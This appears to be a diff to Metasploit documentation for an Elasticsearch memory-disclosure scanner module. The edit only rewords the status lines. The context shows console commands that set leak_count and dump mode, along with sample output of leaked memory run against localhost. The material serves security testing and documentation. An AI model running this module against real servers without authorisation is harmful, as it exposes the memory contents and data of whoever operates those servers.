@@ -61,8 +61,8 @@ msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set leak_count 2
 leak_count => 2
 msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
 
-[*] Leaking heartbeat response #1
-[*] Leaking heartbeat response #2
+[*] Leaking response #1
+[*] Leaking response #2
 [+] Leaked 2106 bytes
 [*] Printable info leaked:
 HTTP/1.1 200 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@.: 2....@.........................................................................................................................................................................................................................................................."[truncated 1048076 bytes].HTTP/1.1 200 OK..rnal Server Error..1:9200..User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.51..Content-Type: application/json..Content-Length: 2....@.: 2....@.........................................................................................................................................................................................................................................................."[truncated 1048076 bytes]
@@ -77,8 +77,8 @@ msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > set action dump
 action => dump
 msf6 auxiliary(scanner/http/elasticsearch_memory_disclosure) > run
 
-[*] Leaking heartbeat response #1
-[*] Leaking heartbeat response #2
+[*] Leaking response #1
+[*] Leaking response #2
 [+] Leaked 2088 bytes
 [+] Elasticsearch memory data stored in /root/.msf4/loot/20230825124508_default_127.0.0.1_elasticsearch.me_033879.bin
 [*] Printable info leaked:
